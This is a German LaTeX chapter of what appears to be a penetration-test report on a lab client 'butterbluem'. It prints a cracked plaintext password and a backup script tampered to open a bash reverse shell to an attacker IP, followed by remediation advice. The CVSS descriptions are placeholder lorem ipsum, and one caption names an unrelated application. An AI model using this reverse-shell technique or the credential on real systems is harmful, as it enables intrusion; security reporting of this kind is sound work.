@@ -1,0 +1,51 @@
+\chapter{Butterblume's Client}
+
+\cvss{av=network, ac=low, pr=none, ui=required, s=changed, c=high, i=high, a=high}
+\cvssdescription{Etiam risus sapien, ornare at dui ut, semper eleifend arcu. In fermentum felis ut ornare convallis. Donec ultrices condimentum neque ut semper.}
+
+\section{\makecvssbadge Butterblume's Client: Unsichere Credential-Verwaltung}
+\cvssaddtosummary{Butterblume's Client: Unsichere Credential-Verwaltung}
+
+\subsection*{Proof of concept} 
+Die Anmeldedaten für den Account "butterbluem" in der Webanwendung Nextcloud konnten durch die Kompromittierung der Nextcloud-Anwendung erlangt werden.Das Vorgehen dazu ist in \autoref{sec:nextcloud} beschrieben. In dieser Webanwendung wurden mehrere Versionen einer Keypass-Datei entdeckt, die mit dem Tool John the Ripper geknackt wurden. In der genannten Keypass-Datei befanden sich unter anderem die Zugangsdaten \texttt{"butterbluem : ielaequei6Aexaet"}.
+
+\subsection*{Empfehlungen}
+\begin{itemize}
+    \item Das Passwort für den Nutzer "butterbluem" sollte umgehend geändert werden und durch eine neues und sicheres Passwort ersetzt werden.
+    \item Multi-Faktor-Authentifizierung (MFA): Durch Verwendung von MFA Methoden wird es Angreiferen deutlich erschwert Zugang zu einem passwortgeschützten Account zu erlangen.
+\end{itemize}
+
+\cvss{av=network, ac=low, pr=none, ui=required, s=changed, c=high, i=high, a=high}
+\cvssdescription{Etiam risus sapien, ornare at dui ut, semper eleifend arcu. In fermentum felis ut ornare convallis. Donec ultrices condimentum neque ut semper.}
+
+\section{\makecvssbadge Butterblume's Client: Authenticated Remote Code Execution}
+\cvssaddtosummary{Butterblume's Client: Authenticated Remote Code Execution}
+
+\subsection*{Proof of concept} 
+Der Nutzer "butterbluem" nutzt ein einfaches Bash-Skript, um das Home-Verzeichnis seines Rechners mit der Nextcloud zu synchronisieren. Dieses Skript ist ebenfalls in den Dateien des Nutzers auf der Nextcloud zu finden. Durch die Anpassung des Skripts kann eine Reverse Shell initiiert werden, da das Skript regelmäßig auf dem Rechner "butterbluem" ausgeführt wird. Zunächst wird dazu ein Netcat-Listener auf dem System des Angreifers gestartet, wie in \autoref{listing:netcat-listener} beschrieben. Anschließend muss das Bash-Skript zur Synchronisation angepasst werden, wie in \autoref{listing:butterbluem:backup} dargestellt. Beim darauffolgenden Aufruf des Bash-Skripts wird die Revers Shell gestartet und der Angreifer erhält vollen Zugriff auf den Rechner "butterbluem". Ein Beweisscreenshot ist in \autoref{fig:08_butterbluem_proof} dargestellt. 
+
+\begin{listing}[!ht]
+\begin{minted}{bash}
+#!/bin/bash
+
+
+bash -c 'bash -i >& /dev/tcp/10.0.32.5/9001 0>&1'
+
+rsync -avP /mnt/backup/* /home/butterbluem/
+\end{minted}
+\caption{Datei backup-home.sh}
+\label{listing:butterbluem:backup}
+\end{listing}
+
+\begin{figure}[!ht]
+    \centering
+    \includegraphics[width=\linewidth]{images/proofs/08_butterbluem_proof.png}
+    \caption{Proof für die Webanwendung Maggot's Pilzboard}
+    \label{fig:08_butterbluem_proof}
+\end{figure}
+
+\subsection*{Empfehlungen}
+\begin{itemize}
+    \item Das Bash-Skript zur Synchronisierung des Home-Verzeichnisses kann durch eine digitale Signatur oder ein Hash abgesichert werden. Dadurch können Änderungen an dem Skript erkannt werden und das Skript dadurch abgebrochen werden.
+    \item Mit Firewall-Regeln können außerdem Reverse-Shell Verbindungen unterbunden werden.
+\end{itemize}
